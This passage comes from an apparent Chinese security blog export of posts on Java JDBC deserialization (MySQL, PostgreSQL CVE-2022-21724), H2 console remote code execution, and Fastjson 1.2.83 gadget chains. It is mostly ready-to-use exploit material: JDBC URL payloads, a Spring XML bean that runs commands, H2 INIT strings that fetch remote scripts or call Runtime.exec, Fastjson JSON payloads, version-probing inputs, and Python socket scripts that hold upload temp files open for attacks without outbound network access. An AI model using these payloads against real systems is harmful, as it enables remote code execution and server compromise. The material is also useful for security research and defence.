COLLATION;,触发逻辑和ServerStatusDiffInterceptor类似,也是会对返回的某些类型字段进行反序列化处理,从而造成漏洞\nPayloadServerStatusDiffInterceptor触发点8.x\njdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n\n6.x\n属性名不同，queryInterceptors更改为statementInterceptors\njdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n\n&gt;&#x3D;5.1.11\njar包中没有cj\njdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\n\n5.x &lt;&#x3D; 5.1.10\n同5.1.11的payload，但需要连接后执行查询。\ndetectCustomCollations触发点5.1.29 - 5.1.40\njdbc:mysql://xxx.xxx.xxx.xxx:3306/test?detectCustomCollations=true&amp;autoDeserialize=true\n\n5.1.28 - 5.1.19\njdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true\n\nPostgreSQL反序列化(CVE-2022-21724)影响版本:9.4.1208 ~ 42.2.2542.3.0 ~ 42.3.2\n当连接pgsql jdbc的url可控时可以通过socketFactory参数指定任意工厂类并实例化(不指定的话就会实例默认工厂类),同时可以通过socketFactoryArg参数传入该工厂类构造函数的参数,也就是说我们可以执行一个任意工厂类的构造函数并且参数也可控\n\nClassPathXmlApplicationContextCLassPathXmlApplicationContext是Spring框架中的一个重要类，用于加载应用程序的上下文配置。它从类路径中读取XML配置文件，并根据该配置文件创建和管理Spring的bean。它的构造函数接收一个String类型的路径参数，支持http://、file://、ftp://、classpath:等多种协议。\n当代码中这样写\nClassPathXmlApplicationContext context1 =          new ClassPathXmlApplicationContext(&quot;Bean.xml&quot;);\n\nBean.xml(也可以是远端文件,如 http://127.0.0.1:80/poc.xml)\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;  &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;          http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;      &lt;bean id=&quot;rce&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;\t    &lt;constructor-arg&gt;  \t        &lt;list&gt;                    &lt;value&gt;calc&lt;/value&gt;  \t        &lt;/list&gt;    \t\t&lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n会触发calc\n\n这是因为在解析这个xml过程中,会先解析这个Bean,之后调用其构造方法\n   &lt;constructor-arg&gt;         &lt;list&gt;                  &lt;value&gt;calc&lt;/value&gt;         &lt;/list&gt;    &lt;/constructor-arg&gt;\n\n上面的xml相当于\nList&lt;String&gt; args = Arrays.asList(&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;);new ProcessBuilder(args);//反射调用\n\n因为声明了init-method=&quot;start&quot;, Spring 的规则是：Bean 构造完成后，自动调用 init-method,于是 Spring 继续反射调用：processBuilder.start();这个函数具有命令执行的功能,从而触发calc\n而在上面提到pgsql jdbc可通过url参数来指定工厂类和该类构造函数的参数,那么就可以利用ClassPathXmlApplicationContext并控制其构造函数的参数来达到命令执行的效果\njdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:80/poc.xml\n\n复现在postgresql.Driver.connect()方法下断点\n\nparseURL函数会对传入的url进行解析给一个urlProps对象,并返回这个对象\n\n之后在makeConnection()函数携带url和props new一个PgConnection对象建立连接\n\nPgConnection构造函数中调用了org.postgresql.core.ConnectionFactory.openConnection()\n\n再调用到org.postgresql.core.v3.ConnectionFactoryImpl.openConnectionImpl()\n\n到这一步去构建工厂类\n\n如果socketFactory为空就返回默认工厂类,否则就调用ObjectFactory.instantiate()去构建\n\n先反射获取我们指定的类,之后优先找 Properties 构造器,没有的话再找String构造器,最后用无参构造器兜底在这我们调用的是ClassPathXmlApplicationContext的String构造器\n\n到这里就携带args参数去newInstance一个ClassPathXmlApplicationContext\n\nFileSystemXmlApplicationContext是ClassPathXmlApplicationContext的“兄弟”，一个读本地，一个读远程。全路径org.springframework.context.support.FileSystemXmlApplicationContext\nFileSystemXmlApplicationContext可以用来打不出网,但需要上传文件,可以结合spring web下面的文件上传缓存机制来打,具体在 JDBC-Mysql反序列化不出网利用 中有提到,除了这种方法,pgsql jdbc还有任意文件写漏洞\n\n任意文件写入影响版本:42.3.0 ~ 42.3.342.1.x\npayload:\njdbc:postgresql:///?loggerLevel=DEBUG&amp;loggerFile=hack.jsp&amp;&lt;%test;%&gt;\n\n用setupLoggerFromProperties函数完成以上日志操作初始化\n\n调用java.util.logging.Logger.log()写入日志\n\n","tags":["javaSec"]},{"title":"H2数据库相关漏洞","url":"/2025/09/19/H2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/","content":"H2 Database是一个纯Java编写的关系型数据库，可以在内存中运行，通常用在小型的应用，自带一个web管理页面,这个H2管理web应用存在一些远程代码执行漏洞,默认不开启，如果开启,默认是不对外开放的,只能本地访问(但是可以配合ssrf漏洞来攻击)\n相关配置\nspring.h2.console.path=/h2-console   # 自定义访问路径spring.h2.console.settings.web-allow-others=true  # 允许非本机访问spring.h2.console.enabled=true   # 启用web管理界面spring.h2.console.settings.web-allow-others=true   # 允许外部用户进行访问管理界面\n\n环境搭建: Spring Boot 整合使用 H2 内存数据库 - spring 中文网\n1.4.x系列(兼容java8的版本)环境:java8 + 1.4.200(1.4系列最新版)\nH2 Database 打JNDI1.1.100&lt;&#x3D; H2 Console &lt;&#x3D;2.0.204\nH2允许通过jndi的形式加载数据源,但没有对lookup()参数做校验导致漏洞\norg.h2.util.JdbcUtils.getConnection()\n\nH2 JDBC连接处利用INIT函数需要目标服务器有javac环境\nH2 支持在 JDBC URL 里用 INIT= 指定一段 SQL,在数据库连接建立时自动执行并且支持 CREATE ALIAS 直接定义 Java 方法,这就导致了可以任意java代码执行\n出网payload(vps上共享的恶意文件不一定要.sql文件,空后缀也可以,可以用来绕过拦截)\njdbc:h2:file:.\\\\data\\\\demo;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:7777/poc.sql&#x27;\n\n不出网payload\njdbc:h2:file:.\\\\data\\\\demo;INIT=DROP ALIAS IF EXISTS EXEC\\;CREATE ALIAS EXEC AS $$void shellexec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc&quot;)\\;&#125;$$\\;CALL EXEC()\n\n\n\n2.x 系列(需要java11+环境)环境: java11 + 2.4.240\n\nH2 Database 打JNDI(被修复)这个漏洞在2.0.204版本被修复,jndi禁用了不安全协议,只允许本地java协议去加载数据\norg.h2.util.JdbcUtils.getConnection()\n\nH2 JDBC连接处利用INIT函数和1.4.x版本一样,不修复是因为官方认为这是正常功能\n出网payload(vps上共享的恶意文件不一定要.sql文件,空后缀也可以,可以用来绕过拦截)\njdbc:h2:file:.\\\\data\\\\demo;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:7777/poc.sql&#x27;\n\n不出网payload\njdbc:h2:file:.\\\\data\\\\demo;INIT=DROP ALIAS IF EXISTS EXEC\\;CREATE ALIAS EXEC AS $$void shellexec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc&quot;)\\;&#125;$$\\;CALL EXEC()\n\n\nCREATE ALIAS 除了可以创建 Java 函数外, 还能够直接引用已知的 Java 静态方法, 这个过程无需javac环境H2 RCE 在 JRE 17 环境下的利用 | X1r0z Blog\nINIT关键词绕过h2自动小写转大写，而“ı”转成大写后等于“I”。“ſ”大写后变成“S”,所以\nINIT=ınıt\n\n\n","tags":["redTeam"]},{"title":"Fastjson1.2.83 + mysql利用(开启autotype)","url":"/2025/09/19/Fastjson1-2-83-mysql%E5%88%A9%E7%94%A8-%E5%BC%80%E5%90%AFautotype/","content":"fastjson在高版本默认是不开启autotype的,这样的话是默认走白名单的,但如果开启了autotype,会走黑名单,黑名单相较于白名单就好绕过多了,因为一直都会有不同组件漏洞被爆出,黑名单再大也会有疏漏,可以用一些黑名单疏漏的类进行攻击\n在这利用了jdbc mysql反序列化漏洞(在之前文章写过jdbc反序列化漏洞和jdbc-Mysql反序列化不出网利用),jdbc漏洞需要一个jdbc的url可控点,fastjson在这里就作为漏洞利用的入口去变相控制了jdbc的url,无需jdbc的url可控功能点了\n利用条件:fastjson1.2.83jdbc mysql依赖Gadget\nmysql8出网payload&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,    &quot;proxy&quot;: &#123;      &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,      &quot;connectionUrl&quot;: &#123;        &quot;@type&quot;: &quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,        &quot;masters&quot;: [          &#123;    &quot;host&quot;: &quot;127.0.0.1&quot;,    &quot;port&quot;: 3306&#125;        ],        &quot;slaves&quot;: [],        &quot;properties&quot;: &#123;          &quot;user&quot;: &quot;deser_CC31_calc&quot;,          &quot;queryInterceptors&quot;: &quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,          &quot;autoDeserialize&quot;: &quot;true&quot;,          &quot;dbname&quot;: &quot;test&quot;,          &quot;useSSL&quot;: &quot;false&quot;        &#125;      &#125;    &#125;  &#125;&#125;\n\n不出网payload&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,    &quot;proxy&quot;: &#123;      &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,      &quot;connectionUrl&quot;: &#123;        &quot;@type&quot;: &quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,        &quot;masters&quot;: [          &#123;&#125;        ],        &quot;slaves&quot;: [],        &quot;properties&quot;: &#123;          &quot;host&quot;: &quot;xxx&quot;,          &quot;user&quot;: &quot;mysql&quot;,          &quot;queryInterceptors&quot;: &quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,          &quot;autoDeserialize&quot;: &quot;true&quot;,          &quot;socketFactory&quot;: &quot;com.mysql.cj.protocol.NamedPipeSocketFactory&quot;,          &quot;path&quot;: &quot;8.txt&quot;,          &quot;maxAllowedPacket&quot;: &quot;74996390&quot;,          &quot;dbname&quot;: &quot;test&quot;,          &quot;useSSL&quot;: &quot;false&quot;        &#125;      &#125;    &#125;  &#125;&#125;\n\nmysql6payload出网还是不出网只需要修改url参数即可\n&#123;       &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,       &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,       &quot;proxy&quot;: &#123;              &quot;connectionString&quot;:&#123;                     &quot;url&quot;:&quot;jdbc:mysql://xxx/test?useSSL=false&amp;autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=mysql&amp;socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&amp;namedPipePath=calc_6.txt&quot;              &#125;       &#125;&#125;\n\n如果像这样反序列化成具体类就无法利用\nPerson person2 = JSON.parseObject(jdbc6,Person.class);\n\nmysql5出网payload&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,    &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,    &quot;portToConnectTo&quot;: 3306,    &quot;databaseToConnectTo&quot;: &quot;test&quot;,    &quot;url&quot;: &quot;&quot;,    &quot;info&quot;: &#123;      &quot;autoDeserialize&quot;: &quot;true&quot;,      &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,      &quot;user&quot;: &quot;deser_CC31_calc&quot;,      &quot;DBNAME&quot;: &quot;test&quot;    &#125;  &#125;&#125;\n不出网payload&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,    &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,    &quot;portToConnectTo&quot;: 3306,    &quot;info&quot;: &#123;      &quot;useSSL&quot;: &quot;false&quot;,      &quot;user&quot;: &quot;mysql&quot;,      &quot;HOST&quot;: &quot;xxx&quot;,      &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,      &quot;autoDeserialize&quot;: &quot;true&quot;,      &quot;NUM_HOSTS&quot;: &quot;1&quot;,      &quot;socketFactory&quot;: &quot;com.mysql.jdbc.NamedPipeSocketFactory&quot;,      &quot;namedPipePath&quot;: &quot;calc_5.txt&quot;,      &quot;DBNAME&quot;: &quot;test&quot;    &#125;,    &quot;databaseToConnectTo&quot;: &quot;test&quot;,    &quot;url&quot;: &quot;&quot;  &#125;&#125;\nfastjson黑盒测试trickDnslog&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0\n\n探测是否是 Fastjson假设正常传参如下：\n&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;\n\n单引号传参：(Fastjson 不报错，Jackson 报错)\n&#123;&quot;username&quot;: &#x27;admin&#x27;, &quot;password&quot;: &#x27;admin&#x27;&#125;\n\n注释符判断法：(Fastjson 报错，Jackson 不报错)\n&#123;&quot;age&quot;: 1&#125;/*#W01fh4cker\n\n注释符判断法：(Fastjson 报错，Gson 不报错)\n#\\r\\n&#123;&quot;score&quot;:1.1&#125;\n\n注释符判断法：(Fastjson 报错，Hutool.json 不报错)\n&#123;a:whatever&#125;/*\\r\\nxxx\n\n多余成员判断法：(Fastjson 不报错，Jackson 报错)\n&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;test&quot;: 1&#125;\n\n报错有回显探测版本payload:\n&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;\n\n[&quot;test&quot;:1]\n\n报错无回显探测版本搭建现代一般web接口逻辑\nimport org.springframework.stereotype.Controller;  import org.springframework.web.bind.annotation.*;  import com.alibaba.fastjson.JSON;  import java.util.HashMap;  import java.util.Map;    @Controller  public class FastjsonController &#123;        @RequestMapping(value = &quot;/fastjson&quot;, method = RequestMethod.POST)      @ResponseBody      public Map&lt;String, Object&gt; parseUser(@RequestBody String body) &#123;            Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();          result.put(&quot;code&quot;, 200);          result.put(&quot;message&quot;, &quot;ok&quot;);            try &#123;                if (user != null &amp;&amp; user.getUsername() != null) &#123;                  result.put(&quot;username&quot;, user.getUsername());              &#125;            &#125; catch (Exception e) &#123;              // 真实生产环境常见：吞异常 / 统一错误              result.put(&quot;code&quot;, 500);              result.put(&quot;message&quot;, &quot;internal error&quot;);          &#125;            return result;      &#125;  &#125;\n\n使用以下对应版本的payload,版本正确会返回200,否则会报500\n\n版本：1.2.83&#x2F;1.2.24\n\n&#123;&quot;test&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.XxException&quot;&#125;&#125;\n\n\n版本：1.2.24-1.2.68\n\n&#123;&quot;test&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;java.io.ByteArrayOutputStream&quot;&#125;&#125;\n\n\n版本：1.2.24-1.2.47\n\n&#123;    &quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,         &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,     &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;&#125;\n\n\n版本 1.2.24\n\n&#123;&quot;test&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;&#125;\n\n以83版本为例\n\n","tags":["javaSec"]},{"title":"JDBC-Mysql反序列化不出网利用","url":"/2025/09/19/JDBC-Mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/","content":" 在JDBC反序列化中提到jdbc mysql反序列化利用需要构造恶意mysql服务器,之后通过控制jdbc连接参数来连接恶意服务器,通过默认查询语句返回恶意序列化对象触发反序列化漏洞 但如果目标不出网,或者一些后台jdbc连接功能对host做了白名单,这样就不能通过上述方法去利用了\nsocketFactory属性在MySQL驱动中有socketFactory这个选项，它默认值为StandardSocketFactory.class.getName()因此它接收的应该是一个类的名字\nMysqlIO在mysql驱动中是一个比较核心的类，在里面有很多的处理逻辑，构造方法如下：\npublic MysqlIO(String host, int port, Properties props,      String socketFactoryClassName, MySQLConnection conn,      int socketTimeout, int useBufferRowSizeThreshold)\n\nsocketFactoryClassName是我们的重点关注参数，在createSocketFactory中实现了这样的代码，socketFactoryClassName指定的类名会被调用newInstance来实例化，且这个类必须实现了SocketFactory接口\nprivate SocketFactory createSocketFactory() throws SQLException &#123;    try &#123;        if (this.socketFactoryClassName == null) &#123;            throw SQLError.createSQLException(Messages.getString(&quot;MysqlIO.75&quot;), //$NON-NLS-1$                SQLError.SQL_STATE_UNABLE_TO_CONNECT_TO_DATASOURCE, getExceptionInterceptor());        &#125;        return (SocketFactory) (Class.forName(this.socketFactoryClassName)                                     .newInstance());    &#125; catch (Exception ex) &#123;        SQLException sqlEx = SQLError.createSQLException(Messages.getString(&quot;MysqlIO.76&quot;) //$NON-NLS-1$             +this.socketFactoryClassName +            Messages.getString(&quot;MysqlIO.77&quot;),            SQLError.SQL_STATE_UNABLE_TO_CONNECT_TO_DATASOURCE, getExceptionInterceptor());              sqlEx.initCause(ex);              throw sqlEx;    &#125;&#125;\n\n在初始化MysqlIO的时候createSocketFactory会被调用，用于提供一个客户端和服务器连接的方式\n指定的类是必须实现了SocketFactory接口的，可以找到驱动中内置的满足条件的类，只有两个\n\nStandardSocketFactory\n\nNamedPipeSocketFactory\n\n\nStandardSocketFactory这个类是默认值,它实现了TCP的连接方式连接mysql,使用这个类就需要我们通过网络连接恶意服务器;\n而从NamedPipeSocketFactory类中的connect方法中看到，它使用了NamedPipeSocket并传入一个path作为参数，并且将实例化后的对象用作一个与服务器交互的通道：\n\n使用RandomAccessFile打开并且最终使用这个文件流作为与服务器连接的IO通道\n\nnamedPipePath参数,也就是文件路径,是可以通过url控制的,这就给予了不出网利用思路:找到一个文件上传点上传恶意流量文件,再通过socketFactory参数指定NamedPipeSocketFactory,并用namedPipePath指向恶意文件路径,充当恶意mysql服务器\n注:在mysql8中限制了数据包的大小,需要加上maxAllowedPacket&#x3D;74996390参数来绕过\n利用环境:java8 + jdbc-mysql8 + cc3.2.1\n恶意流量包可以通过java-chains工具生成,注意jdbc-mysql版本vulhub&#x2F;java-chains: Java Vulnerability Exploitation Platform\n\n\n上传恶意数据文件到目标服务器如果web应用没有上传文件的功能点(只要能上传可控内容的文件就可以,不需要能控制文件后缀),可以利用spring web下面的文件上传缓存机制。\nspring web（或者tomcat）默认使用commons-fileupload来处理文件上传的数据包，而在上传的数据超过一定阈值时会将上传的数据从内存中缓存到临时文件，在commons-fileupload的 Builder 类的构造方法中定义了一个缓冲区大小DiskFileItemFactory.DEFAULT_THRESHOLD（10240b）\npublic Builder() &#123;            setBufferSize(DiskFileItemFactory.DEFAULT_THRESHOLD);            setPath(PathUtils.getTempDirectory());            setCharset(DEFAULT_CHARSET);            setCharsetDefault(DEFAULT_CHARSET);        &#125;\n\n而上传的数据超过这个缓冲区大小后，就会被缓存到磁盘中，但不确定文件路径，DiskFileItem类中的代码实现：\nprivate DiskFileItem(final String fieldName, final String contentType, final boolean isFormField, final String fileName, final int threshold,        final Path repository, final FileItemHeaders fileItemHeaders, final Charset defaultCharset) &#123;    this.fieldName = fieldName;    this.contentType = contentType;    this.charsetDefault = defaultCharset;    this.isFormField = isFormField;    this.fileName = fileName;    this.fileItemHeaders = fileItemHeaders;    this.threshold = threshold;    this.repository = repository != null ? repository : PathUtils.getTempDirectory();    this.tempFile = this.repository.resolve(String.format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId()));&#125;\n\n可以知道PathUtils.getTempDirectory获取了一个临时目录（实际测试中使用springweb临时目录在&#x2F;tmp下的tomcat的work目录中），并且拼接了一个UID值和getUniqueId()，UID是类被初始化后就固定的一个随机UUID\n而getUniqueId则是自增，每次发生文件缓存都会+1\nprivate static String getUniqueId() &#123;    final var limit = 100_000_000;    final var current = COUNTER.getAndIncrement();    var id = Integer.toString(current);    // If you manage to get more than 100 million of ids, you&#x27;ll    // start getting ids longer than 8 characters.    if (current &lt; limit) &#123;        id = (&quot;00000000&quot; + id).substring(id.length());    &#125;    return id;&#125;\n\n因此最后生成的路径如下格式：\n/tmp/&#123;tomcat_path&#125;/work/Tomcat/localhost/ROOT/upload_&#123;UID&#125;_&#123;UniqueId&#125;.tmp\n且文件上传请求结束后会被自动调用delete方法进行删除\n\n现在可以将文件通过上传缓存的方式生成在服务器上，但是有两个问题需要解决：\n\n每次请求完成就自动删除，且ID会自增，条件竞争非常困难\n\n临时文件位置随机，无法直接获取\n\n\n解决自动删除问题:删除逻辑是请求结束执行删除操作,我们可以利用Content-Length:请求头设置很长的值,而实际文件大小并没有很大,会让服务器以为还有很多数据没有被发送过来,会一直等待\n注意:结束标识符–xxxxxxxx–已经告诉服务器这个multipart包已经结束了，因此将最后一个结束标志的–去除,并且不建议使用burp或yakit发包,会自动修改Content-Length:还可能会主动断开连接\nimport socket  import time    payload_path = r&quot;path_to_payload&quot;    with open(payload_path, &quot;rb&quot;) as f:      payload = f.read()    req = b&#x27;&#x27;&#x27;POST / HTTP/1.1  Host: localhost  Accept-Encoding: gzip, deflate  Accept: */*  Content-Type: multipart/form-data; boundary=xxxxxxxx  User-Agent: python-requests/2.32.3  Content-Length: 999999    --xxxxxxxx  Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;tmp.txt&quot;    &#123;&#123;payload&#125;&#125;  --xxxxxxxx&#x27;&#x27;&#x27;.replace(b&quot;\\n&quot;, b&quot;\\r\\n&quot;).replace(b&quot;&#123;&#123;payload&#125;&#125;&quot;, payload)  skt = socket.socket()  skt.connect((&quot;127.0.0.1&quot;, 8085))  skt.sendall(req)  time.sleep(999)\n\n文件成功留存windows临时文件位置C:\\Users\\用户\\AppData\\Local\\Temp\\tomcat……\\work\\Tomcat\\ip\\ROOT\n\nLinux:&#x2F;tmp&#x2F;{tomcat_path}&#x2F;work&#x2F;Tomcat&#x2F;localhost&#x2F;ROOT&#x2F;upload_{UID}_{UniqueId}.tmp\n\n解决文件位置问题:利用heapdump泄露如果目标有heapdump泄露漏洞,可以利用此漏洞分析heapdump文件找到上传文件路径\n环境配置pom.xml中引入actuator依赖\n&lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;  &lt;/dependency&gt;\n\n配置不安全配置\nmanagement.endpoints.web.exposure.include=*  management.endpoint.heapdump.enabled=true\n\n安全配置应该为\nmanagement.endpoints.web.exposure.include=health,info//白名单management.endpoints.web.exposure.exclude=heapdump,threaddump,env,configprops,beans,mappings//黑名单management.endpoint.heapdump.enabled=false//直接从根上禁用 JVM 堆导出\n\n发文件上传包之后访问&#x2F;actuator&#x2F;heapdump拿到heapdump文件\n用工具解析,找到上传文件的路径这里用的是visualVM路径信息在org.apache.tomcat.util.http.fileupload.disk.DiskFileItem这个类下面\n\n如果是直接用的heapdump自动扫描工具如(JDumpSpider)是扫不到这个临时文件信息的\n\n最多也就只能看到这些信息\n在我们分析heapdump的时间里面，可能已经触发了超时机制，连接被强制断开并删除临时文件了。但是我们可以预判下一个临时文件的名字，只需要修改/tmp/&#123;tomcat_path&#125;/work/Tomcat/localhost/ROOT/upload_&#123;UID&#125;_&#123;UniqueId&#125;.tmp中的UniqueId + 1即可。\n利用Linux的&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xx(不需要其他漏洞打配合)Linux下，应用程序打开一个文件，并且在没有关闭的情况下&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xx会生成一个文件描述符，如果打开的是一个文件，这个文件描述符实际上指向的是这个文件的具体路径。\n\n所以在利用的时候文件路径只需要写&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xx就可以(xx需要爆破一下,很好爆破)\n但需要注意的是文件需要是打开状态,而像上面那样写的话因为文件后面有–xxxxxxxx结束符,文件参数上传完之后就会关闭,所以需要把结束符删掉来让应用以为文件内容还没写完而保持打开状态\nimport socket  import time    payload_path = r&quot;path_to_payload&quot;    with open(payload_path, &quot;rb&quot;) as f:      payload = f.read()    req = b&#x27;&#x27;&#x27;POST / HTTP/1.1  Host: localhost  Accept-Encoding: gzip, deflate  Accept: */*  Content-Type: multipart/form-data; boundary=xxxxxxxx  User-Agent: python-requests/2.32.3  Content-Length: 999999    --xxxxxxxx  Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;tmp.txt&quot;    &#123;&#123;payload&#125;&#125;  &#x27;&#x27;&#x27;.replace(b&quot;\\n&quot;, b&quot;\\r\\n&quot;).replace(b&quot;&#123;&#123;payload&#125;&#125;&quot;, payload)  skt = socket.socket()  skt.connect((&quot;127.0.0.1&quot;, 8085))  skt.sendall(req)  time.sleep(999)\n\n这样在没有heapdump泄露的情况下也能完成攻击,对于需要本地文件的攻击也都可以试试这个思路\n","tags":["javaSec"]}]